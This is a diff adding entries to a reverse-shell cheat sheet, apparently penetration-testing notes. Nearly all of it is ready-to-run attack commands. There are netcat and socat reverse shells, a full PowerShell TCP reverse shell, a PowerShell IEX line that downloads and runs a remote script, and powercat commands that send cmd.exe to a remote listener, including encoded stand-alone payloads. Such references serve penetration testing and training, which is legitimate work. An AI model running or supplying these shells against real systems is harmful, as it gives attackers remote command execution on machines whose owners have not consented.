@@ -180,12 +180,19 @@ function printit ($string) {
 
 ### Netcat
 
-```
+```bash
 nc -e /bin/sh 10.0.0.1 4242
 nc -e /bin/bash 10.0.0.1 4242
 nc -c bash 10.0.0.1 4242
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+### Socat
+
+```bash
+socat -d -d TCP4-LISTEN:443 STDOUT # listener
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash # reverse shell
 ```
 
 ## Windows
@@ -204,3 +211,27 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
 
+```powershell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Powercat
+
+```
+# listener
+sudo nc -lvp 443
+# send a reverse shell
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+```
+
+#### Stand-alone payload
+
+```
+# unencoded
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+./reverseshell.ps1
+
+# encoded
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+powershell.exe -E + entired encoded string
+```
